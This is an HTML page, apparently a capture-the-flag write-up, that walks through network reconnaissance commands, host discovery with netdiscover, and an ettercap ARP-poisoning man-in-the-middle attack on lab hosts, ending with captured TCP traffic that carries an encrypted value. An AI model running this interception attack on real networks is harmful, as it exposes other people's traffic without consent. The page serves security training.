@@ -1,0 +1,133 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>All Ears</title>
+</head><body>CyWar<br/>
+<br/>
+All Ears<br/>
+<br/>
+	Network<br/>
+<br/>
+	echo -e &quot;\n [*] IP Address of this machine: \n&quot; &amp;&amp; ifconfig | grep inet &amp;&amp; echo -e &quot;\n [*] Default Route (Router IP): \n&quot; &amp;&amp; ip route | grep default ; echo -e &quot;\n [*] Routing Table:\n&quot; &amp;&amp; netstat -rune ; echo -e &quot;\n [*] LISTEN/ESTABLISHED Connections - Open Ports: \n&quot; &amp;&amp; netstat -tulean # ports <br/>
+<br/>
+	Endpoint (Attacker’s Machine) 	<br/>
+<br/>
+	echo -e &quot;\n [*] Current User: \n&quot; &amp;&amp; whoami &amp;&amp; echo -e &quot;\n [*] Current Hostname: \n&quot; &amp;&amp; hostname ; echo -e &quot;\n [*] Can this user 'sudo?': \n&quot; &amp;&amp; sudo -l ; echo -e &quot;\n [*] OS Information: \n&quot; &amp;&amp; uname -a ; echo -e &quot;\n [*] MORE VERSION INFO: \n &quot; &amp;&amp; cat /proc/version<br/>
+<br/>
+	Host discovery: <br/>
+<br/>
+	sudo /usr/sbin/netdiscover -f -S <br/>
+<br/>
+	Currently scanning: 10.7.79.0/8  |  Screen View: Unique Hosts                                                                                                                                                     <br/>
+                                                                                                                                                                                    <br/>
+2 Captured ARP Req/Rep packets, from 2 hosts.  Total size: 84                                                                                                                                                     <br/>
+_____________________________________________________________________________<br/>
+ IP      At MAC Address   Count   Len MAC Vendor / Hostname   <br/>
+-----------------------------------------------------------------------------<br/>
+172.23.0.1   02:42:b2:22:45:d0   1   42 Unknown vendor                                                                                                                     <br/>
+172.23.0.2   02:42:ac:17:00:02   1   42 Unknown vendor                                                                                                                     <br/>
+<br/>
+<br/>
+	sudo /usr/bin/ettercap -T /172.23.0.0-255// /172.23.0.0-255//<br/>
+<br/>
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team<br/>
+<br/>
+Listening on:<br/>
+ eth0 -&gt; 02:42:AC:17:00:04<br/>
+     172.23.0.4/255.255.0.0<br/>
+<br/>
+<br/>
+Privileges dropped to EUID 65534 EGID 65534...<br/>
+<br/>
+ 34 plugins<br/>
+ 42 protocol dissectors<br/>
+ 57 ports monitored<br/>
+28230 mac vendor fingerprint<br/>
+1766 tcp OS fingerprint<br/>
+2182 known services<br/>
+Lua: no scripts were specified, not starting up!<br/>
+<br/>
+Scanning for merged targets (256 hosts)...<br/>
+<br/>
+* |==================================================&gt;| 100.00 %<br/>
+<br/>
+3 hosts added to the hosts list...<br/>
+Starting Unified sniffing...<br/>
+<br/>
+<br/>
+Text only Interface activated...<br/>
+Hit 'h' for inline help<br/>
+<br/>
+<br/>
+<br/>
+Hosts list:<br/>
+<br/>
+1)   172.23.0.1   02:42:B2:22:45:D0<br/>
+2)   172.23.0.2   02:42:AC:17:00:02<br/>
+3)   172.23.0.3   02:42:AC:17:00:03<br/>
+<br/>
+<br/>
+	<br/>
+	ARP Poisoning - MITM Attack<br/>
+<br/>
+	sudo /usr/bin/ettercap -T -M arp /172.23.0.2// /172.23.0.3//<br/>
+<br/>
+<br/>
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team<br/>
+<br/>
+Listening on:<br/>
+ eth0 -&gt; 02:42:AC:17:00:04<br/>
+     172.23.0.4/255.255.0.0<br/>
+<br/>
+<br/>
+Privileges dropped to EUID 65534 EGID 65534...<br/>
+<br/>
+ 34 plugins<br/>
+ 42 protocol dissectors<br/>
+ 57 ports monitored<br/>
+28230 mac vendor fingerprint<br/>
+1766 tcp OS fingerprint<br/>
+2182 known services<br/>
+Lua: no scripts were specified, not starting up!<br/>
+<br/>
+Scanning for merged targets (2 hosts)...<br/>
+<br/>
+* |==================================================&gt;| 100.00 %<br/>
+<br/>
+2 hosts added to the hosts list...<br/>
+<br/>
+ARP poisoning victims:<br/>
+<br/>
+GROUP 1 : 172.23.0.2 02:42:AC:17:00:02<br/>
+<br/>
+GROUP 2 : 172.23.0.3 02:42:AC:17:00:03<br/>
+Starting Unified sniffing...<br/>
+<br/>
+<br/>
+Text only Interface activated...<br/>
+Hit 'h' for inline help<br/>
+<br/>
+<br/>
+<br/>
+Mon May 31 10:52:32 2021 [977556]<br/>
+TCP 172.23.0.3:38652 --&gt; 172.23.0.2:13337 | S (0)<br/>
+<br/>
+<br/>
+Mon May 31 10:52:33 2021 [29802]<br/>
+TCP 172.23.0.2:13337 --&gt; 172.23.0.3:38652 | SA (0)<br/>
+<br/>
+<br/>
+Mon May 31 10:52:33 2021 [29815]<br/>
+TCP 172.23.0.3:38652 --&gt; 172.23.0.2:13337 | P (53)<br/>
+{['data', 'enc', 'a72a2b1bf1edce8b234ce1ae5a1e3568']}<br/>
+<br/>
+Mon May 31 10:52:33 2021 [34408]<br/>
+TCP 172.23.0.2:13337 --&gt; 172.23.0.3:38652 | R (0)<br/>
+<br/>
+<br/>
+<br/>
+User requested a CTRL+C... (deprecated, next time use proper shutdown)<br/>
+<br/>
+	<br/>
+<br/>
+</body></html>
